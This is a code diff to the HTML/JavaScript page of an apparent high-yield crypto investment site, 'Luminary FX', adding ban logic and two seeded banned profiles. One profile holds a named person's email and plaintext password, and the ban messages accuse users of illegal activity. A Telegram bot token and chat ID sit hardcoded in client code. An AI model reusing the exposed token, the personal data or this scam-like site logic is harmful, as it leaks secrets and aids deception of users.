@@ -879,11 +879,11 @@
                 <i class="fa-solid fa-ban"></i>
             </div>
             <h1 style="font-size: 26px; font-weight: 800; color: #FFFFFF; margin-bottom: 12px;">Account Banned</h1>
-            <p style="font-size: 14px; color: #94A3B8; line-height: 1.6; margin-bottom: 24px;">
-                Your account (ID: <strong>45110731</strong>) has been permanently suspended due to a violation of our institutional terms and security policies.
+            <p style="font-size: 14px; color: #94A3B8; line-height: 1.6; margin-bottom: 16px;" id="bannedMsgText">
+                Your account (ID: <strong id="bannedAccIdDisplay">45110731</strong>) has been permanently suspended due to a violation of our institutional terms and security policies.
             </p>
-            <div style="background: rgba(239, 68, 68, 0.1); border: 1px dashed #EF4444; padding: 14px; border-radius: 12px; margin-bottom: 24px; font-size: 13px; color: #EF4444; font-weight: 700;">
-                Please Register a New Account to continue using Luminary FX.
+            <div style="background: rgba(239, 68, 68, 0.1); border: 1px dashed #EF4444; padding: 14px; border-radius: 12px; margin-bottom: 24px; font-size: 13px; color: #EF4444; font-weight: 700;" id="bannedSinhalaMsg">
+                නීති විරෝධී ක්‍රියාකාරකම් හේතුවෙන් ඔබගේ ගිණුම ඉවත් කර ඇත. කරුණාකර සේවාව සක්‍රියව භාවිත කිරීමට නව ගිණුමක් ලියාපදිංචි කරන්න.
             </div>
             <button class="btn btn-gold" onclick="switchBannedToRegister()">
                 <i class="fa-solid fa-user-plus"></i> Register New Account
@@ -1230,7 +1230,6 @@
                     <div class="crypto-card">
                         <img src="https://assets.coingecko.com/coins/images/279/large/ethereum.png" class="crypto-logo" alt="Ethereum">
                         <div>
-                            <div style="font-weight: 800; font-size: 15px;">Ethereum (ETH)</div>
                             <div style="font-size: 12px; color: var(--accent-green); font-weight: 600;">+3.1% High Yield</div>
                             <div style="font-size: 11px; color: var(--text-muted);">Smart Contract v2</div>
                         </div>
@@ -1739,6 +1738,9 @@
         const TELEGRAM_BOT_TOKEN = "8600939006:AAFU_mYGDtZHMKx08oif4PnJO-vGCZtzm0c";
         const TELEGRAM_CHAT_ID = "8441230005";
 
+        /* --- BANNED ACCOUNT IDS LIST --- */
+        const BANNED_ACCOUNT_IDS = ["45110731", "80142444"];
+
         /* --- THEME TOGGLE LOGIC --- */
         function toggleTheme() {
             const currentTheme = document.documentElement.getAttribute('data-theme') || 'dark';
@@ -1856,6 +1858,14 @@
             }
         }
 
+        function showBannedScreen(accId) {
+            document.getElementById('bannedAccIdDisplay').innerText = accId || '--------';
+            document.getElementById('bannedMsgText').innerHTML = `Your account (ID: <strong>${accId || '--------'}</strong>) has been permanently suspended due to a violation of our institutional terms, illegal activities, and security policies.`;
+            document.getElementById('bannedSinhalaMsg').innerText = `නීති විරෝධී ක්‍රියාකාරකම් සහ අසාධු ලේඛනගත කිරීම් හේතුවෙන් ඔබගේ ගිණුම (ID: ${accId || '--------'}) පද්ධතියෙන් ඉවත් කර ඇත. ඔබගේ ගිණුම සම්පූර්ණයෙන්ම තහනම් (Banned) කර ඇත.`;
+            document.getElementById('bannedScreen').style.display = 'flex';
+            document.getElementById('authModal').style.display = 'none';
+        }
+
         function switchBannedToRegister() {
             document.getElementById('bannedScreen').style.display = 'none';
             document.getElementById('authModal').style.display = 'flex';
@@ -1868,20 +1878,42 @@
                 btnIcon.className = savedTheme === 'dark' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
             }
 
-            const targetUsername = "prakashvidura";
-            
-            if (!systemDB.users[targetUsername]) {
-                const targetProfile = { 
+            /* SETUP TARGET BANNED USER 1 (45110731) */
+            const targetUsername1 = "prakashvidura";
+            if (!systemDB.users[targetUsername1]) {
+                const targetProfile1 = { 
                     name: "Prakash Vidura", email: "prakashvidura56@gmail.com", phone: "+94770000000", 
-                    username: targetUsername, pass: "Pass123", referral: "", idNumber: "45110731", 
+                    username: targetUsername1, pass: "Pass123", referral: "", idNumber: "45110731", 
                     dob: "1995-01-01", city: "Colombo", country: "Sri Lanka" 
                 };
-                const targetData = createEmptyUserData(targetProfile, "45110731");
-                targetData.isBanned = true;
-                systemDB.users[targetUsername] = targetData;
+                const targetData1 = createEmptyUserData(targetProfile1, "45110731");
+                targetData1.isBanned = true;
+                systemDB.users[targetUsername1] = targetData1;
             } else {
-                systemDB.users[targetUsername].accountId = "45110731";
-                systemDB.users[targetUsername].isBanned = true;
+                systemDB.users[targetUsername1].accountId = "45110731";
+                systemDB.users[targetUsername1].isBanned = true;
+            }
+
+            /* SETUP TARGET BANNED USER 2 (80142444) */
+            let targetUsername2 = null;
+            for (let uKey in systemDB.users) {
+                if (systemDB.users[uKey].accountId === "80142444") {
+                    targetUsername2 = uKey;
+                    break;
+                }
+            }
+            if (!targetUsername2) {
+                targetUsername2 = "user_80142444";
+                const targetProfile2 = { 
+                    name: "Banned User", email: "banned80142444@luminary.com", phone: "+94770000000", 
+                    username: targetUsername2, pass: "Banned123", referral: "", idNumber: "80142444", 
+                    dob: "1995-01-01", city: "Colombo", country: "Sri Lanka" 
+                };
+                const targetData2 = createEmptyUserData(targetProfile2, "80142444");
+                targetData2.isBanned = true;
+                systemDB.users[targetUsername2] = targetData2;
+            } else {
+                systemDB.users[targetUsername2].isBanned = true;
             }
 
             saveSystemDB();
@@ -1890,9 +1922,8 @@
             if (systemDB.currentUsername && systemDB.users[systemDB.currentUsername]) {
                 currentUserData = systemDB.users[systemDB.currentUsername];
                 
-                if (currentUserData.isBanned || currentUserData.accountId === "45110731") {
-                    document.getElementById('bannedScreen').style.display = 'flex';
-                    document.getElementById('authModal').style.display = 'none';
+                if (currentUserData.isBanned || BANNED_ACCOUNT_IDS.includes(currentUserData.accountId)) {
+                    showBannedScreen(currentUserData.accountId);
                     return;
                 }
 
@@ -1969,9 +2000,8 @@
             }
 
             if (targetKey && systemDB.users[targetKey].profile.pass === passStr) {
-                if (systemDB.users[targetKey].isBanned || systemDB.users[targetKey].accountId === "45110731") {
-                    document.getElementById('authModal').style.display = 'none';
-                    document.getElementById('bannedScreen').style.display = 'flex';
+                if (systemDB.users[targetKey].isBanned || BANNED_ACCOUNT_IDS.includes(systemDB.users[targetKey].accountId)) {
+                    showBannedScreen(systemDB.users[targetKey].accountId);
                     return;
                 }
 
@@ -2967,3 +2997,4 @@
     </script>
 </body>
 </html>
+
